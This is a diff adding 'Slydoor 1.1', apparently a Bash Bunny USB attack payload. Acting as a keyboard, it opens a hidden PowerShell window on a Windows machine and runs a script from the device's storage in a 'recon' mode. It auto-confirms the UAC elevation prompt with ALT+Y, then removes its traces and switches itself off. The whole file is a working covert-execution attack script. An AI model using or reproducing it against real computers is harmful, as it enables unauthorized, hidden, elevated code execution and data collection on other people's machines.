@@ -1,0 +1,51 @@
+# Slydoor 1.1
+
+## [OPTION] Mode
+### Looks for file with this name (doesn't need extension here - but file requires '.ps1' extension)
+MODE="recon"
+
+LED M 200
+LOOT_DIR="/root/udisk/loot/Slydoor"
+PAYLOAD_DIR="/root/udisk/payloads/$SWITCH_POSITION"
+LOG_PATH="/root/udisk/logs/Slydoor.log"
+
+echo "[+]--SLYDOOR STARTED--[+]" > $LOG_PATH
+echo "+ Switch: $SWITCH_POSITION" >> $LOG_PATH
+echo "+ Mode: $MODE" >> $LOG_PATH
+echo "---" >> $LOG_PATH
+
+# Check for our script (pretty pointless payload if you don't have it..)
+cd $PAYLOAD_DIR
+mkdir -p $LOOT_DIR
+if ! [ -f "a.ps1" ]
+then
+	LED R 400
+	echo "- Powershell Passer not found (a.ps1)" >> $LOG_PATH
+	exit 1
+fi
+if ! [ -f "$MODE.ps1" ]
+then
+	LED R 400
+	echo "- Can't find mode script" >> $LOG_PATH
+	exit 1
+fi
+cp $MODE.ps1 $LOOT_DIR/$MODE.ps1
+LED B 200
+echo "+ Preparing the Bunny.." >> $LOG_PATH
+ATTACKMODE HID STORAGE
+echo "+ Starting PowerShell.." >> $LOG_PATH
+RUN WIN powershell "-WindowStyle Hidden .((gwmi win32_volume -f 'label=''DJBUNNY''').Name+'payloads\\$SWITCH_POSITION\a.ps1') $MODE"
+LED C 200
+echo "+ Bypassing UAC.." >> $LOG_PATH
+sleep 7
+Q ALT Y
+LED W 200
+echo "+ Cleaning up payload environment.." >> $LOG_PATH
+sleep 3
+LED W SUCCESS
+# Go dark!
+ATTACKMODE OFF
+LED OFF
+rm -f "$LOOT_DIR/$MODE.ps1"
+echo "---" >> $LOG_PATH
+echo "[+]--SLYDOOR FINISHED--[+]" >> $LOG_PATH
